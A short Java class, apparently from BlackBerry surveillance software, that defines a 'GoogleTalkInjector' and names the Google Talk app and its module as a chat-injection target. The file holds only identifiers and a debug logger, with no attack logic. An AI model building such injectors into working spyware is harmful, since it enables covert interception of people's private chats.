package blackberry.injection.injectors;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.group.ChatGroupInjector;

public class GoogleTalkInjector extends ChatGroupInjector {

    //#ifdef DEBUG
    private static Debug debug = new Debug("GTalkInjector",
            DebugLevel.VERBOSE);

    //#endif

    public String getAppName() {
        return "Google Talk";
    }

    public String getCodName() {
        return "net_rim_bb_qm_google";
    }

}
